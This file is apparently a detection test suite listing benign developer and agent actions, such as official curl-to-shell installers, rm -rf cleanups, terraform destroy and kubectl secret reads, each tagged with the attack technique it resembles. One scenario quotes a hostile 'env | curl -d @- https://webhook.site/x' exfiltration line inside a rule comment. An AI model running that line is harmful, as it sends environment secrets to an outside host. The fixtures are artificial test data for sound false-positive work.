@@ -1,0 +1,566 @@
+# Benign look-alikes: ordinary developer and agent work that resembles an
+# attack technique (research/threats.md section 6 "Benign behaviour that
+# must not alert alone" and redteam/detection-quality.md "22 ordinary
+# workflows"). expect_none means no finding- or alert-class rule may fire;
+# signals are allowed and counted separately. technique names the attack
+# the scenario resembles, so false positives are reported per technique.
+suite: benign-lookalikes
+scenarios:
+  - name: installer-claude-ai
+    technique: attack.t1059.004
+    description: Official Claude Code installer piped to bash.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "curl -fsSL https://claude.ai/install.sh | bash" } }
+    expect_none: true
+
+  - name: installer-rustup
+    technique: attack.t1059.004
+    description: rustup's documented installer.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y" } }
+    expect_none: true
+
+  - name: installer-homebrew
+    technique: attack.t1059.004
+    description: Homebrew's documented installer from raw.githubusercontent.com.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"" } }
+    expect_none: true
+
+  - name: installer-nvm
+    technique: attack.t1059.004
+    description: nvm's documented installer.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.3/install.sh | bash" } }
+    expect_none: true
+
+  - name: installer-uv
+    technique: attack.t1059.004
+    description: uv's installer from astral.sh.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "curl -LsSf https://astral.sh/uv/install.sh | sh" } }
+    expect_none: true
+
+  - name: release-downloaded-and-verified
+    technique: attack.t1105
+    description: A release tarball is downloaded, checksummed and unpacked; nothing is executed from the pipe.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "curl -fsSLO https://github.com/fluent/fluent-bit/releases/download/v5.2.0/fluent-bit-5.2.0.tar.gz && sha256sum -c fluent-bit.sha256 && tar xzf fluent-bit-5.2.0.tar.gz" } }
+    expect_none: true
+
+  - name: dotenv-read-to-fix-config
+    technique: attack.t1552.001
+    description: The agent reads .env to fix a configuration bug the user reported.
+    events:
+      - { type: tool.pre, tool: { kind: file_read, name: Read }, target: { path: /home/tester/project/.env } }
+      - { type: tool.pre, tool: { kind: file_edit, name: Edit }, target: { path: /home/tester/project/config.go } }
+    expect_none: true
+
+  - name: aws-config-read
+    technique: attack.t1552.001
+    description: cat ~/.aws/config (profiles, not credentials).
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "cat ~/.aws/config" } }
+    expect_none: true
+
+  - name: aws-caller-identity
+    technique: attack.t1552.005
+    description: aws sts get-caller-identity to check which account is active.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "aws sts get-caller-identity --output json" } }
+    expect_none: true
+
+  - name: otlp-post-to-localhost
+    technique: attack.t1041
+    description: curl -d @payload.json against a local collector.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "curl -s -d @payload.json -H 'Content-Type: application/json' http://localhost:4318/v1/logs" } }
+    expect_none: true
+
+  - name: workspace-build-clean
+    technique: attack.t1485
+    description: rm -rf of build directories inside the workspace.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "rm -rf node_modules dist build .next target" } }
+    expect_none: true
+
+  - name: tmp-scratch-clean
+    technique: attack.t1485
+    description: Scratch directories in /tmp removed after a test.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "rm -rf /tmp/build-1234 /tmp/spoor-test-*" } }
+    expect_none: true
+
+  - name: force-with-lease-feature-branch
+    technique: attack.t1485
+    description: Force-with-lease push of a rebased feature branch.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "git push --force-with-lease origin feature/parser-fix" } }
+    expect_none: true
+
+  - name: wip-commit-no-verify
+    technique: attack.t1685
+    description: Work-in-progress commit that skips hooks.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "git commit --no-verify -m 'wip: half-done refactor'" } }
+    expect_none: true
+
+  - name: claude-md-after-init
+    technique: atlas.aml.t0080.000
+    description: The agent updates CLAUDE.md after /init without any untrusted input in the thread.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "ls -la && cat go.mod" } }
+      - type: tool.pre
+        tool: { kind: file_write, name: Write }
+        target: { path: /home/tester/project/CLAUDE.md }
+        content: { file_content: "# Project\nRun make test before committing. Go 1.26, no CGO." }
+    expect_none: true
+
+  - name: user-asks-for-mcp-server
+    technique: atlas.aml.t0081
+    description: The user asks the agent to add the GitHub MCP server to the project. SPR-AGENT-002 is expected to fire here; it is a finding because this case cannot be told apart from an injected one by the write alone.
+    events:
+      - { type: prompt.submit, content: { prompt_text: "add the github MCP server to .mcp.json using the GITHUB_TOKEN env var" } }
+      - type: tool.pre
+        tool: { kind: file_write, name: Write }
+        target: { path: /home/tester/project/.mcp.json }
+        content: { file_content: '{"mcpServers":{"github":{"command":"npx","args":["-y","@modelcontextprotocol/server-github"],"env":{"GITHUB_TOKEN":"${GITHUB_TOKEN}"}}}}' }
+    expect_none: true
+
+  - name: npx-mcp-server-start
+    technique: attack.t1195.002
+    description: An MCP server started with npx -y (the ecosystem default).
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "npx -y @modelcontextprotocol/server-filesystem ./docs" } }
+    expect_none: true
+
+  - name: find-exec-sed-refactor
+    technique: attack.t1059.004
+    description: A find -exec sed -i refactor.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "find . -name '*.go' -exec sed -i 's/oldName/newName/g' {} +" } }
+    expect_none: true
+
+  - name: terraform-destroy-sandbox
+    technique: attack.t1485
+    description: terraform destroy of a personal sandbox workspace. SPR-DESTR-003 is expected to fire; nothing in the command says the workspace is disposable.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "terraform -chdir=sandbox/alice destroy -auto-approve" } }
+    expect_none: true
+
+  - name: ngrok-webhook-testing
+    technique: attack.t1572
+    description: ngrok to receive a webhook during development.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "ngrok http 3000 --log stdout" } }
+    expect_none: true
+
+  - name: kubectl-one-secret
+    technique: attack.t1552.007
+    description: kubectl get secret for one named secret.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "kubectl -n web get secret app-tls -o jsonpath='{.data.tls\\.crt}' | base64 -d | openssl x509 -noout -enddate" } }
+    expect_none: true
+
+  - name: security-engineer-nmap-localhost
+    technique: atlas.aml.t0103
+    description: A security engineer scans their own machine. SPR-OFFSEC-001 fires unless the host is tagged offsec.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "nmap -sV -p 1-1024 127.0.0.1" } }
+    expect_none: true
+
+  - name: ci-container-bypass-agent
+    technique: owasp.asi10
+    description: A headless agent with approvals off inside a CI container (no lifecycle parent).
+    events:
+      - { type: agent.process.start, agent: { id: claude-code }, process: { name: claude, args: [claude, --dangerously-skip-permissions, -p, "fix the lint errors"], flags: [--dangerously-skip-permissions], ancestors: [bash, docker-init] }, labels: { headless: "true" } }
+    expect_none: true
+
+  - name: orchestrator-child-agent
+    technique: atlas.aml.t0053
+    description: An orchestrator starts a child agent with default permissions.
+    events:
+      - { type: agent.process.start, agent: { id: claude-code }, process: { name: claude, args: [claude, -p, "review the diff"], ancestors: [node, claude] }, labels: { headless: "true", parent_agent: claude-code } }
+    expect_none: true
+
+  - name: readme-emoji-and-rtl
+    technique: attack.t1027.018
+    description: README with emoji ZWJ sequences and Hebrew text.
+    events:
+      - type: tool.pre
+        tool: { kind: file_write, name: Write }
+        target: { path: /home/tester/project/README.md }
+        content: { file_content: "# Team 👩‍💻👨‍🔬\nשלום — contributors welcome." }
+    expect_none: true
+
+  - name: claude-md-with-emoji
+    technique: attack.t1027.018
+    description: CLAUDE.md that uses an emoji ZWJ sequence.
+    events:
+      - type: tool.pre
+        tool: { kind: file_write, name: Write }
+        target: { path: /home/tester/project/CLAUDE.md }
+        content: { file_content: "Ask the 👩‍💻 on call before deploying." }
+    expect_none: true
+
+  - name: readme-with-badges-fetched
+    technique: atlas.aml.t0077
+    description: A fetched GitHub README full of shields.io badges.
+    events:
+      - type: tool.post
+        tool: { kind: web_fetch, name: WebFetch }
+        target: { url: "https://github.com/fluent/fluent-bit", host: github.com }
+        content: { tool_output: "![CI](https://img.shields.io/github/actions/workflow/status/fluent/fluent-bit/ci.yml) ![License](https://img.shields.io/badge/license-Apache%202.0-blue)" }
+    expect_none: true
+
+  - name: git-lfs-install
+    technique: attack.t1574
+    description: git lfs install writes LFS filters into the git configuration.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "git lfs install && git config filter.lfs.process 'git-lfs filter-process'" } }
+    expect_none: true
+
+  - name: husky-hooks-path
+    technique: attack.t1574
+    description: husky points core.hooksPath at .husky.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "git config core.hooksPath .husky" } }
+    expect_none: true
+
+  - name: local-model-endpoint
+    technique: atlas.aml.t0083
+    description: The base URL points at a local model server.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "OPENAI_BASE_URL=http://127.0.0.1:11434/v1 python3 eval.py" } }
+    expect_none: true
+
+  - name: docker-network-host
+    technique: attack.t1611
+    description: docker run --network host for a local test (the environment's documented way to reach the stack).
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "docker run --rm --network host -v $PWD/fb:/fluent-bit/etc fluent/fluent-bit:latest" } }
+    expect_none: true
+
+  - name: docker-rm-test-containers
+    technique: attack.t1485
+    description: Removing the session's own test containers.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "docker rm -f fbt1 fbt2 fbt3 2>/dev/null; docker volume prune -f" } }
+    expect_none: true
+
+  - name: testcontainers-docker-socket
+    technique: attack.t1611
+    description: A test container mounts the Docker socket (testcontainers' ryuk).
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "docker run -d -v /var/run/docker.sock:/var/run/docker.sock testcontainers/ryuk:0.11.0" } }
+    expect_none: true
+
+  - name: sudo-apt-install
+    technique: attack.t1548.003
+    description: Installing a package with sudo.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "sudo apt-get update && sudo apt-get install -y jq ripgrep" } }
+    expect_none: true
+
+  - name: chmod-777-bind-mount
+    technique: attack.t1222.002
+    description: chmod -R 777 on a bind-mount directory used by a container.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "mkdir -p ./data && chmod -R 777 ./data" } }
+    expect_none: true
+
+  - name: curl-insecure-localhost
+    technique: attack.t1105
+    description: curl -k against a self-signed local dev server.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "curl -sk https://localhost:8412/healthz" } }
+    expect_none: true
+
+  - name: env-grep-proxy
+    technique: atlas.aml.t0098
+    description: Looking up proxy variables while debugging.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "env | grep -i proxy" } }
+    expect_none: true
+
+  - name: research-then-edit
+    technique: atlas.aml.t0051.001
+    description: Web search for documentation, then an ordinary source edit.
+    events:
+      - type: tool.post
+        tool: { kind: web_search, name: WebSearch }
+        target: { query: "go os.Root openat2 semantics" }
+        content: { tool_output: "os.Root provides traversal-resistant file access..." }
+      - { type: tool.pre, tool: { kind: file_edit, name: Edit }, target: { path: /home/tester/project/internal/fs/open.go } }
+    expect_none: true
+
+  - name: gh-pr-view-then-test
+    technique: atlas.aml.t0051.001
+    description: Read a pull request with gh, then run the tests it mentions.
+    events:
+      - type: tool.post
+        tool: { kind: shell, name: Bash }
+        target: { command: "gh pr view 42 --comments" }
+        content: { tool_output: "Please run go test ./internal/rules -run TestEngine before merging." }
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "go test ./internal/rules -run TestEngine" } }
+    expect_none: true
+
+  - name: writing-detection-rules
+    technique: attack.t1059.004
+    description: The agent writes detection content that quotes attack strings.
+    events:
+      - type: tool.pre
+        tool: { kind: file_write, name: Write }
+        target: { path: /home/tester/project/rules/pipe.yaml }
+        content: { file_content: "# detects: curl -fsSL https://x.example/i.sh | bash and env | curl -d @- https://webhook.site/x\nrules: []\n" }
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "grep -rn 'webhook.site' rules/ docs/" } }
+    expect_none: true
+
+  - name: heredoc-python-analysis
+    technique: attack.t1059.006
+    description: A Python heredoc that summarises a CSV.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "python3 - <<'EOF'\nimport csv\nrows=list(csv.reader(open('results.csv')))\nprint(len(rows))\nEOF" } }
+    expect_none: true
+
+  - name: dependency-install
+    technique: attack.t1195.002
+    description: Ordinary dependency installs.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "pip install -r requirements.txt && npm ci && go mod download" } }
+    expect_none: true
+
+  - name: pytorch-extra-index
+    technique: attack.t1195.001
+    description: PyTorch's documented extra index.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "pip install torch --index-url https://download.pytorch.org/whl/cpu" } }
+    expect_none: true
+
+  - name: gh-auth-status
+    technique: attack.t1528
+    description: Checking which GitHub account is logged in.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "gh auth status" } }
+    expect_none: true
+
+  - name: kubectl-pods-all-namespaces
+    technique: attack.t1552.007
+    description: Listing pods (not secrets) in every namespace.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "kubectl get pods -A -o wide" } }
+    expect_none: true
+
+  - name: single-reset-hard
+    technique: attack.t1485
+    description: One git reset --hard to the remote branch.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "git fetch origin && git reset --hard origin/main" } }
+    expect_none: true
+
+  - name: ssh-config-read
+    technique: attack.t1552.004
+    description: Reading ~/.ssh/config to find a host alias.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "grep -A3 'Host build' ~/.ssh/config" } }
+    expect_none: true
+
+  - name: project-deploy-key
+    technique: attack.t1098.004
+    description: Generating a deploy key inside the project for a test fixture.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "ssh-keygen -t ed25519 -N '' -f ./testdata/deploy_key -C test" } }
+    expect_none: true
+
+  - name: public-key-read
+    technique: attack.t1552.004
+    description: Printing a public key to add it to a service.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "cat ~/.ssh/id_ed25519.pub" } }
+    expect_none: true
+
+  - name: scp-artifact
+    technique: attack.t1048
+    description: Copying a build artefact to a staging server.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "scp dist/app.tar.gz deploy@staging.internal.example:/srv/releases/" } }
+    expect_none: true
+
+  - name: s3-artifact-upload
+    technique: attack.t1567.002
+    description: Uploading a release to the team bucket.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "aws s3 cp dist/app.tar.gz s3://acme-releases/app/1.4.0/" } }
+    expect_none: true
+
+  - name: crontab-list
+    technique: attack.t1053.003
+    description: Listing the user's crontab.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "crontab -l" } }
+    expect_none: true
+
+  - name: systemctl-status-security-tool
+    technique: attack.t1685
+    description: Checking whether osqueryd is running.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "systemctl status osqueryd --no-pager" } }
+    expect_none: true
+
+  - name: kill-dev-server
+    technique: attack.t1685
+    description: Stopping the project's own dev server.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "pkill -f 'node server.js'; lsof -ti:3000 | xargs -r kill" } }
+    expect_none: true
+
+  - name: vscode-editor-settings
+    technique: atlas.aml.t0081
+    description: Writing ordinary editor settings.
+    events:
+      - type: tool.pre
+        tool: { kind: file_write, name: Write }
+        target: { path: /home/tester/project/.vscode/settings.json }
+        content: { file_content: '{"editor.formatOnSave": true, "go.lintTool": "golangci-lint"}' }
+    expect_none: true
+
+  - name: vscode-build-task
+    technique: atlas.aml.t0081
+    description: A build task without folder-open auto-run.
+    events:
+      - type: tool.pre
+        tool: { kind: file_write, name: Write }
+        target: { path: /home/tester/project/.vscode/tasks.json }
+        content: { file_content: '{"version":"2.0.0","tasks":[{"label":"build","type":"shell","command":"make build","group":"build"}]}' }
+    expect_none: true
+
+  - name: claude-settings-allow-tests
+    technique: atlas.aml.t0081
+    description: Project settings that allow go test without asking.
+    events:
+      - type: tool.pre
+        tool: { kind: file_write, name: Write }
+        target: { path: /home/tester/project/.claude/settings.json }
+        content: { file_content: '{"permissions":{"allow":["Bash(go test:*)","Bash(make lint)"]}}' }
+    expect_none: true
+
+  - name: user-asks-for-format-hook
+    technique: atlas.aml.t0081
+    description: The user asks for a gofmt PostToolUse hook. SPR-AGENT-001 is expected to fire; a hook is code that runs later whoever asked for it.
+    events:
+      - { type: prompt.submit, content: { prompt_text: "add a hook that runs gofmt -w on every Go file you edit" } }
+      - type: tool.pre
+        tool: { kind: file_write, name: Write }
+        target: { path: /home/tester/project/.claude/settings.json }
+        content: { file_content: '{"hooks":{"PostToolUse":[{"matcher":"Edit|Write","hooks":[{"type":"command","command":"gofmt -w \"$CLAUDE_FILE_PATHS\""}]}]}}' }
+    expect_none: true
+
+  - name: downloads-pdf-read
+    technique: atlas.aml.t0051.001
+    description: Reading an invoice the user saved to Downloads.
+    events:
+      - { type: tool.pre, tool: { kind: file_read, name: Read }, target: { path: /home/tester/Downloads/invoice-2026-10.pdf } }
+    expect_none: true
+
+  - name: history-tail
+    technique: attack.t1552.003
+    description: Looking at recent shell history through the history builtin.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "history | tail -20" } }
+    expect_none: true
+
+  - name: debug-recon
+    technique: attack.t1082
+    description: A few host checks while debugging a build.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "uname -a; go version; df -h ." } }
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "ps aux | grep -c node" } }
+    expect_none: true
+
+  - name: base64-fixture
+    technique: attack.t1140
+    description: Decoding a base64 fixture to a file.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "base64 -d testdata/cert.b64 > testdata/cert.der" } }
+    expect_none: true
+
+  - name: python-one-liner
+    technique: attack.t1059.006
+    description: A Python one-liner that pretty-prints JSON.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "python3 -c 'import json,sys; print(json.dumps(json.load(sys.stdin), indent=2))' < out.json" } }
+    expect_none: true
+
+  - name: private-repo-create
+    technique: attack.t1567.001
+    description: Creating a private repository.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "gh repo create acme/internal-tool --private --source . --push" } }
+    expect_none: true
+
+  - name: api-post-json
+    technique: attack.t1041
+    description: POSTing JSON to the team's staging API.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "curl -s -X POST https://staging-api.example/v1/items -H 'Content-Type: application/json' -d '{\"name\":\"widget\"}'" } }
+    expect_none: true
+
+  - name: ci-agent-on-push
+    technique: attack.t1677
+    description: The scan finds an agent workflow that runs on push only.
+    events:
+      - { type: inventory.asset, asset: { id: ci-push, kind: ci_agent, name: claude-code-action, scope: project, path: /home/tester/project/.github/workflows/review.yml } }
+    expect_none: true
+
+  - name: pinned-mcp-server
+    technique: atlas.aml.t0109
+    description: The scan finds a pinned, registry-hosted MCP server.
+    events:
+      - { type: inventory.asset, asset: { id: mcp-pinned, kind: mcp_server, name: filesystem, scope: user, mcp: { runner: npx, package: "@modelcontextprotocol/server-filesystem", version: "2026.1.14", pinned: true }, risk_flags: [remote_fetch_exec] } }
+    expect_none: true
+
+  - name: current-agent-version
+    technique: atlas.aml.t0109
+    description: The scan finds a current Claude Code release with managed policy.
+    events:
+      - { type: inventory.asset, asset: { id: ag-cur, kind: agent, name: Claude Code, catalog_id: claude-code, version: "2.1.287", risk_flags: [managed_policy_present], telemetry: { hooks: managed, transcript: tailing } } }
+    expect_none: true
+
+  - name: hook-runs-formatter
+    technique: atlas.aml.t0081
+    description: The scan finds a user hook that runs a formatter.
+    events:
+      - { type: inventory.asset, asset: { id: hook-fmt, kind: hook, name: PostToolUse, parent: claude-code, scope: user, path: /home/tester/.claude/settings.json } }
+    expect_none: true
+
+  - name: secret-read-used-locally
+    technique: atlas.aml.t0086
+    description: A token is read from .env and used against a local service only.
+    events:
+      - type: tool.post
+        tool: { kind: file_read, name: Read }
+        target: { path: /home/tester/project/.env }
+        content: { tool_output: "LOCAL_API_TOKEN=Wq2eR5tY8uI1oP4aS7dF0gH3jK6lZ9xC\n" }
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "curl -s -H 'Authorization: Bearer Wq2eR5tY8uI1oP4aS7dF0gH3jK6lZ9xC' http://localhost:8080/v1/me" } }
+    expect_none: true
+
+  - name: dig-txt-record
+    technique: attack.t1071.004
+    description: Checking a DMARC record.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "dig +short TXT _dmarc.example.com" } }
+    expect_none: true
+
+  - name: nc-port-check
+    technique: attack.t1059.004
+    description: Checking whether a local port is open.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "nc -zv localhost 5432" } }
+    expect_none: true
+
+  - name: ssh-bastion-proxyjump
+    technique: attack.t1059.004
+    description: ssh through a bastion with ProxyJump.
+    events:
+      - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "ssh -J bastion.example deploy@10.0.3.7 'systemctl status app --no-pager'" } }
+    expect_none: true
